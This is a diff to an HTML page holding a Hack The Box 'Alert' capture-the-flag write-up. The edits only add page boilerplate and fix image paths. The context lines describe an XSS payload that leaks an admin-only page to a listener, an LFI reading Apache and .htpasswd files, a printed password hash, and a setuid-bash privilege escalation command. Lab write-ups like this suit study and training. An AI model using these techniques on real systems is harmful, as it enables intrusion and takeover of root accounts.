@@ -1,3 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alert &mdash; HTB Writeup</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <main class="main-content">
+        <div class="content-card">
+            <p><a href="/machines.html">&larr; All write-ups</a></p>
 <div class="writeup-content">
     <div style="text-align: center;">
         <h1>Hack The Box</h1>
@@ -46,7 +58,7 @@
 
     <p>When I visited the "About Us" page I could see this message:</p>
 
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png">
 
     <p>The administrator checks the contact messages at "Contact us".</p>
 
@@ -54,7 +66,7 @@
         First we will check the uploading tab "Markdown Viewer".</p>
     <p>I sent a <code>.md</code> file which I created. Next I got redirected and the contents of the file were displayed.</p>
 
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png">
 
     
     <p>This way I discovered it was vulnerable to XSS. I crafted a payload to leak <code>messages.php</code></p> via the administrator's session:</p>
@@ -90,15 +102,15 @@ fetch('http://alert.htb/messages.php')
 
     <p>Before continuing I checked the "visualizer.php" file.I read the source code <code>CTRL+U</code> and found out that the uploaded file was saved with a different name.</p>
 
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png">
 
     <p>I found out that at "Contact Us" there was a form that I could fill</p> 
     <p>I set a listener and tried to see if there was any response.</p>
 
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png">
 
     
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png">
 
     <p>Combining all the above I uploaded the script discussed as <code>payload.md</code>, opened a listener and copy-pasted the link from source code.</p>
         <code>http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md</code>
@@ -111,7 +123,7 @@ fetch('http://alert.htb/messages.php')
     <p>After I read the <code>.txt</code> file, I used the LFI vulnerability and I read the default Apache configuration file</p>
     <p>It was revealed that  <code>.htpasswd</code> file has credentials for the statistics subdomain:</p>
     
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png">
 
     
     <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
@@ -145,7 +157,7 @@ system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;
         <li><strong>chmod 6777 /tmp/damn</strong>: Sets full access permissions (read/write/execute) for everyone.</li>
  </ul>
 
-    <img src="pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png">
+    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png">
 
     <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
     <div class="terminal-box">/tmp/damn -p</div>
@@ -155,3 +167,8 @@ system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;
         <code>65383dc809d3cec5c5677403436...</code>
     </fieldset>
 </div>
+        </div>
+    </main>
+    <script src="/copy.js"></script>
+</body>
+</html>
